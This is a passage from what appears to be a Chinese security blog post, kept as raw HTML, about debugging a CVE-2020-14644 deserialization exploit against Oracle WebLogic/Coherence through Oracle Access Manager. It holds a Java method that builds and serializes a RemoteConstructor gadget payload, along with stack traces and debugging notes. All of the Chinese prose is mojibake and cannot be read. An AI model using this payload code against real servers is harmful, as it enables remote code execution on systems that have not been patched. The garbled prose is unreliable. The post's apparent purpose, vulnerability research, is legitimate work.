</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-76-21><a style=outline:none;text-decoration:none;color:inherit href=#hl-76-21>21</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-76-22><a style=outline:none;text-decoration:none;color:inherit href=#hl-76-22>22</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-76-23><a style=outline:none;text-decoration:none;color:inherit href=#hl-76-23>23</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-76-24><a style=outline:none;text-decoration:none;color:inherit href=#hl-76-24>24</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-76-25><a style=outline:none;text-decoration:none;color:inherit href=#hl-76-25>25</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-76-26><a style=outline:none;text-decoration:none;color:inherit href=#hl-76-26>26</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-76-27><a style=outline:none;text-decoration:none;color:inherit href=#hl-76-27>27</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>		at java.lang.ClassLoader.defineClass(ClassLoader.java:635)
</span></span><span style=display:flex><span>	at com.tangosol.internal.util.invoke.RemotableSupport.defineClass(RemotableSupport.java:181)
</span></span><span style=display:flex><span>	at com.tangosol.internal.util.invoke.RemotableSupport.realize(RemotableSupport.java:137)
</span></span><span style=display:flex><span>	at com.tangosol.internal.util.invoke.RemoteConstructor.newInstance(RemoteConstructor.java:122)
</span></span><span style=display:flex><span>	at com.tangosol.internal.util.invoke.RemoteConstructor.readResolve(RemoteConstructor.java:233)
</span></span><span style=display:flex><span>	
</span></span><span style=display:flex><span>	at com.tangosol.util.ExternalizableHelper.realize(ExternalizableHelper.java:4938)
</span></span><span style=display:flex><span>	at com.tangosol.util.ExternalizableHelper.readObject(ExternalizableHelper.java:2607)
</span></span><span style=display:flex><span>	at com.tangosol.util.ExternalizableHelper.readObject(ExternalizableHelper.java:2583)
</span></span><span style=display:flex><span>	
</span></span><span style=display:flex><span>	at com.tangosol.coherence.servlet.AttributeHolder.readExternal(AttributeHolder.java:407)
</span></span><span style=display:flex><span>	at com.tangosol.coherence.servlet.AttributeHolder.readExternal(AttributeHolder.java:372)
</span></span><span style=display:flex><span>	
</span></span><span style=display:flex><span>	at java.io.ObjectInputStream.readExternalData(ObjectInputStream.java:2234)
</span></span><span style=display:flex><span>	at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:2183)
</span></span><span style=display:flex><span>	at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1665)
</span></span><span style=display:flex><span>	at java.io.ObjectInputStream.readObject(ObjectInputStream.java:501)
</span></span><span style=display:flex><span>	at java.io.ObjectInputStream.readObject(ObjectInputStream.java:459)
</span></span><span style=display:flex><span>	at weblogic.rmi.provider.BasicServiceContext.readExternal(BasicServiceContext.java:56)
</span></span><span style=display:flex><span>	
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>at java.io.ObjectInputStream.readExternalData(ObjectInputStream.java:2234)
</span></span><span style=display:flex><span>	at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:2183)
</span></span><span style=display:flex><span>	at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1665)
</span></span><span style=display:flex><span>	at java.io.ObjectInputStream.readObject(ObjectInputStream.java:501)
</span></span><span style=display:flex><span>	at java.io.ObjectInputStream.readObject(ObjectInputStream.java:459)
</span></span><span style=display:flex><span>	at oracle.security.am.proxy.opensso.controller.OpenssoEngineController.unmarshal(OpenssoEngineController.java:2453)
</span></span></code></pre></td></tr></table></div></div><p>åªåœ¨å°è¯• <code>com.tangosol.internal.util.invoke.RemoteConstructor.newInstance</code> çš„æ—¶å€™æ‰¾ä¸åˆ° <code>com.tangosol.internal.util.invoke.Remotable</code> ã€‚</p><p>è™½ç„¶æŠ¥é”™æ˜¯</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-77-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-77-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>java.lang.NoClassDefFoundError: com/tangosol/internal/util/invoke/Remotable
</span></span></code></pre></td></tr></table></div></div><p>ä½†ä»ç”Ÿæˆpayloadçš„ä»£ç ç»“åˆä¸Šé¢çš„é”™è¯¯å †æ ˆæ¥çœ‹ï¼Œå¯èƒ½å¹¶ä¸æ˜¯æ²¡æœ‰æ‰¾åˆ° <code>com.tangosol.internal.util.invoke.Remotable</code> è¿™ä¸ªç±»ï¼Œè€Œæ˜¯åœ¨æ„å»ºè¿™ä¸ªç±»çš„è¿‡ç¨‹ä¸­ï¼Œå°è¯•é€šè¿‡å­—èŠ‚ç defineclassçš„æ—¶å€™å‡ºé”™äº†ã€‚</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-78-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-78-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-78-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-78-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-78-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-78-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-78-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-78-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-78-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-78-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-78-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-78-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-78-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-78-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-78-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-78-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-78-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-78-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-78-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-78-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-78-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-78-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-78-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-78-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-78-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-78-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-78-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-78-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-78-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-78-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-78-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-78-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-78-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-78-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-78-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-78-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-78-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-78-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-78-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-78-20>20</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-78-21><a style=outline:none;text-decoration:none;color:inherit href=#hl-78-21>21</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-78-22><a style=outline:none;text-decoration:none;color:inherit href=#hl-78-22>22</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-78-23><a style=outline:none;text-decoration:none;color:inherit href=#hl-78-23>23</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-78-24><a style=outline:none;text-decoration:none;color:inherit href=#hl-78-24>24</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-78-25><a style=outline:none;text-decoration:none;color:inherit href=#hl-78-25>25</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>cve_2020_14644_wrap</span><span style=color:#f92672>()</span> <span style=color:#66d9ef>throws</span> Exception <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        ClassIdentity classIdentity <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ClassIdentity<span style=color:#f92672>(</span>test6<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        ClassPool cp <span style=color:#f92672>=</span> ClassPool<span style=color:#f92672>.</span><span style=color:#a6e22e>getDefault</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        CtClass ctClass <span style=color:#f92672>=</span> cp<span style=color:#f92672>.</span><span style=color:#a6e22e>get</span><span style=color:#f92672>(</span>test6<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>.</span><span style=color:#a6e22e>getName</span><span style=color:#f92672>());</span>
</span></span><span style=display:flex><span>        ctClass<span style=color:#f92672>.</span><span style=color:#a6e22e>replaceClassName</span><span style=color:#f92672>(</span>test6<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>.</span><span style=color:#a6e22e>getName</span><span style=color:#f92672>(),</span> test6<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>.</span><span style=color:#a6e22e>getName</span><span style=color:#f92672>()</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;$&#34;</span> <span style=color:#f92672>+</span> classIdentity<span style=color:#f92672>.</span><span style=color:#a6e22e>getVersion</span><span style=color:#f92672>());</span>
</span></span><span style=display:flex><span>        System<span style=color:#f92672>.</span><span style=color:#a6e22e>out</span><span style=color:#f92672>.</span><span style=color:#a6e22e>println</span><span style=color:#f92672>(</span>ctClass<span style=color:#f92672>.</span><span style=color:#a6e22e>getName</span><span style=color:#f92672>());</span>
</span></span><span style=display:flex><span>        RemoteConstructor constructor <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> RemoteConstructor<span style=color:#f92672>(</span>
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>new</span> ClassDefinition<span style=color:#f92672>(</span>classIdentity<span style=color:#f92672>,</span> ctClass<span style=color:#f92672>.</span><span style=color:#a6e22e>toBytecode</span><span style=color:#f92672>()),</span>
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[]{}</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        AttributeHolder attributeHolder<span style=color:#f92672>=</span><span style=color:#66d9ef>new</span> AttributeHolder<span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        Method setInternalValue<span style=color:#f92672>=</span>attributeHolder<span style=color:#f92672>.</span><span style=color:#a6e22e>getClass</span><span style=color:#f92672>().</span><span style=color:#a6e22e>getDeclaredMethod</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;setInternalValue&#34;</span><span style=color:#f92672>,</span>Object<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        setInternalValue<span style=color:#f92672>.</span><span style=color:#a6e22e>setAccessible</span><span style=color:#f92672>(</span><span style=color:#66d9ef>true</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        setInternalValue<span style=color:#f92672>.</span><span style=color:#a6e22e>invoke</span><span style=color:#f92672>(</span>attributeHolder<span style=color:#f92672>,</span>constructor<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        BasicServiceContext basicServiceContext<span style=color:#f92672>=</span><span style=color:#66d9ef>new</span> BasicServiceContext<span style=color:#f92672>(</span><span style=color:#ae81ff>1</span><span style=color:#f92672>,</span>attributeHolder<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>//        String sobj = serialize(basicServiceContext);
</span></span></span><span style=display:flex><span><span style=color:#75715e>//        System.out.println(sobj);
</span></span></span><span style=display:flex><span><span style=color:#75715e>//        deserialize(sobj);
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#75715e>//        writeTextToClipboard(oamserialize(basicServiceContext));
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        System<span style=color:#f92672>.</span><span style=color:#a6e22e>out</span><span style=color:#f92672>.</span><span style=color:#a6e22e>println</span><span style=color:#f92672>(</span>oamserialize<span style=color:#f92672>(</span>basicServiceContext<span style=color:#f92672>));</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span></code></pre></td></tr></table></div></div><p>è€Œä¸”æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œgadgetchainä¸­çš„å‰é¢å‡ ä¸ªç±»éƒ½å·²ç»è¢«æ‰¾åˆ°å¹¶ä¸”æˆåŠŸåˆ›å»ºå‡ºæ¥äº†ã€‚</p><p><img loading=lazy src=image-20220630211425221.png alt=image-20220630211425221></p><h4 id=æ’é™¤å­—èŠ‚ç ç±»åä¸åŒ¹é…>æ’é™¤å­—èŠ‚ç ç±»åä¸åŒ¹é…<a hidden class=anchor aria-hidden=true href=#æ’é™¤å­—èŠ‚ç ç±»åä¸åŒ¹é…>#</a></h4><p>åœ¨ <code>com.tangosol.internal.util.invoke.RemotableSupport.realize</code> ä¸‹æ–­ç‚¹ï¼Œæœ€ç»ˆä¼šçœ‹åˆ°è¿›64è¡ŒåæŠ¥é”™ï¼Œè€Œæ²¡æœ‰åŠæ³•çœŸæ­£æ‰§è¡Œåˆ°69è¡Œå»åˆ›å»ºå¯¹è±¡ã€‚</p><p><img loading=lazy src=image-20220324000537306.png alt=image-20220324000537306></p><p><img loading=lazy src=image-20220323232857649.png alt=image-20220323232857649></p><p><img loading=lazy src=image-20220323233030604.png alt=image-20220323233030604></p><p><img loading=lazy src=image-20220323233348219.png alt=image-20220323233348219></p><p>è¿™é‡Œæ³¨æ„åˆ°æ–‡æ¡£è¯´æ˜</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-79-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-79-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-79-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-79-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-79-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-79-3>3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-79-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-79-4>4</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>If name is not null, it must be equal to the binary name of the class specified by the byte array &#34;b&#34;, otherwise a NoClassDefFoundError will be thrown.
</span></span><span style=display:flex><span>......
</span></span><span style=display:flex><span>Throws:
</span></span><span style=display:flex><span>	NoClassDefFoundError â€“ If name is not equal to the binary name of the class specified by b
</span></span></code></pre></td></tr></table></div></div><p>è¿™ä¸ªé”™è¯¯<code>NoClassDefFoundError</code> å’Œæˆ‘ä»¬åœ¨logä¸­çœ‹åˆ°çš„ä¸€æ¨¡ä¸€æ ·ï¼Œå¾ˆæœ‰å¯èƒ½æ˜¯è¿™ä¸ªé—®é¢˜å¯¼è‡´çš„ã€‚</p><p>å†ç»†çœ‹æ­¤æ—¶çš„å‚æ•°çŠ¶æ€ï¼Œä¼ å…¥çš„ç±»åæ˜¯ <code>pers.neo.test$C5BD10F93D5F6E3E791935D6BFC036F5</code> ã€‚</p><p><img loading=lazy src=image-20220323234043860.png alt=image-20220323234043860></p><p>çœ‹ä¸€ä¸‹ä¼ å…¥çš„requesterå‚æ•°ä¸­çš„åºåˆ—åŒ–æ•°æ®ä¸­çš„ç±»åæ˜¯ä»€ä¹ˆï¼Ÿæ˜¯ <code>pers/neo/test$C5BD10F93D5F6E3E791935D6BFC036F5</code></p><p><img loading=lazy src=image-20220323234856309.png alt=image-20220323234856309></p><p>ä¸€æ¨¡ä¸€æ ·ï¼Œé‚£ä¹ˆä¸ºä»€ä¹ˆå‘¢ï¼Ÿååå¤å¤ï¼Œç»§ç»­åœ¨æ¥ä¸‹æ¥è¿™ä¸€è¡Œä¸­æŠ¥å‡ºé”™è¯¯ï¼š</p><p><img loading=lazy src=image-20220323234423502.png alt=image-20220323234423502></p><p>å†è·Ÿå…¥å°±æ˜¯nativeä»£ç äº†ã€‚</p><p><img loading=lazy src=image-20220323234456731.png alt=image-20220323234456731></p><p>ä¼šä¸ä¼šæ˜¯å­—èŠ‚ç ä¸­çš„ç±»åä¼ å…¥çš„å‚æ•°çš„ç±»åä¸ä¸€è‡´å¯¼è‡´çš„å‘¢ï¼Ÿå°è¯•ä½¿ç”¨ <a href=https://www.class-visualizer.net/download.html>https://www.class-visualizer.net/download.html</a> å¯è§†åŒ–test.class ç±»ï¼Œçœ‹çœ‹æ˜¯å¦å› ä¸ºideaç›´æ¥ç¼–è¯‘å¯¼è‡´çš„äº§ç”Ÿä¸´æ—¶éšæœºç±»åã€‚</p><p>ä½†è°ƒè¯•å¯ä»¥çœ‹åˆ°ç±»åæ˜¯ä»£ç è‡ªå·±å–å‡ºæ¥å¤„ç†è¿‡çš„ï¼Œæ²¡æœ‰é—®é¢˜ã€‚</p><p><img loading=lazy src=image-20220324002454076.png alt=image-20220324002454076></p><p>è¿™ä¸ªå°†å­—èŠ‚ç ä¸­çš„ç±»åè¿›è¡Œæ›¿æ¢ï¼ˆåŠ ä¸Šversionidï¼‰çš„åŠ¨ä½œæ˜¯CVE-2020-14644æ‰€éœ€è¦è¿›è¡Œçš„æ­£å¸¸æ“ä½œï¼Œä¸ºäº†æ»¡è¶³ClassIdentityæ‰€éœ€è¦çš„ç‰¹æ®Šé€»è¾‘ã€‚</p><p><img loading=lazy src=image-20220324002915407.png alt=image-20220324002915407></p><p>å¦‚æœä¸åšæ”¹å˜çš„è¯åè€Œä¼šæŠ¥ç±»ä¼¼ä¸‹é¢è¿™æ ·çš„ wrong name çš„é”™è¯¯</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-80-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-80-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span>Exception in thread <span style=color:#e6db74>&#34;main&#34;</span> java<span style=color:#f92672>.</span><span style=color:#a6e22e>lang</span><span style=color:#f92672>.</span><span style=color:#a6e22e>NoClassDefFoundError</span><span style=color:#f92672>:</span> pers<span style=color:#f92672>/</span>neo<span style=color:#f92672>/</span>test1$8CEAA052CA2629E7D4BAD619B2948F57 <span style=color:#f92672>(</span>wrong name<span style=color:#f92672>:</span> pers<span style=color:#f92672>/</span>neo<span style=color:#f92672>/</span>test1$5DF7AE1FE635F73F435EBEC61A76120B<span style=color:#f92672>)</span>
</span></span></code></pre></td></tr></table></div></div><p><img loading=lazy src=image-20220324004931718.png alt=image-20220324004931718></p><p>å¹¶ä¸”æœ¬åœ°ç¼–è¯‘å¤šæ¬¡ï¼Œç¡®è®¤ <code>classIdentity.getVersion()</code> å¯¹äºåŒä¸€ä¸ªç±»æ€»æ˜¯èƒ½æ‹¿åˆ°ä¸€æ ·çš„versionå€¼ã€‚</p><p>è‡³æ­¤æ’é™¤æ˜¯defineClassæ—¶å€™ç±»åä¸ä¸€è‡´å¯¼è‡´çš„é—®é¢˜ã€‚</p><p>åŒæ—¶ï¼Œæˆ‘å‘ç°è‡ªå·±ä¸€ç›´é€‰æ‹©æ€§å¿½ç•¥ä¸€ä¸ªå…³é”®äº‹å®</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-81-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-81-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-81-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-81-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-81-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-81-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-81-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-81-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-81-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-81-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-81-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-81-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-81-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-81-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-81-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-81-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-81-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-81-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-81-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-81-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-81-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-81-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-81-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-81-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-81-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-81-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-81-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-81-14>14</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span>java.lang.NoClassDefFoundError: com/tangosol/internal/util/invoke/Remotable
</span></span><span style=display:flex><span>	at java.lang.ClassLoader.defineClass1(Native Method)
</span></span><span style=display:flex><span>	at java.lang.ClassLoader.defineClass(ClassLoader.java:756)
</span></span><span style=display:flex><span>	at java.lang.ClassLoader.defineClass(ClassLoader.java:635)
</span></span><span style=display:flex><span>	at com.tangosol.internal.util.invoke.RemotableSupport.defineClass(RemotableSupport.java:181)
</span></span><span style=display:flex><span>	at com.tangosol.internal.util.invoke.RemotableSupport.realize(RemotableSupport.java:137)
</span></span><span style=display:flex><span>	Truncated. see log file for complete stacktrace
</span></span><span style=display:flex><span>Caused By: java.lang.ClassNotFoundException: com.tangosol.internal.util.invoke.Remotable
</span></span><span style=display:flex><span>	at java.lang.ClassLoader.findClass(ClassLoader.java:523)
</span></span><span style=display:flex><span>	at java.lang.ClassLoader.loadClass(ClassLoader.java:418)
</span></span><span style=display:flex><span>	at java.lang.ClassLoader.loadClass(ClassLoader.java:351)
</span></span><span style=display:flex><span>	at java.lang.ClassLoader.defineClass1(Native Method)
</span></span><span style=display:flex><span>	at java.lang.ClassLoader.defineClass(ClassLoader.java:756)
</span></span><span style=display:flex><span>	Truncated. see log file for complete stacktrace
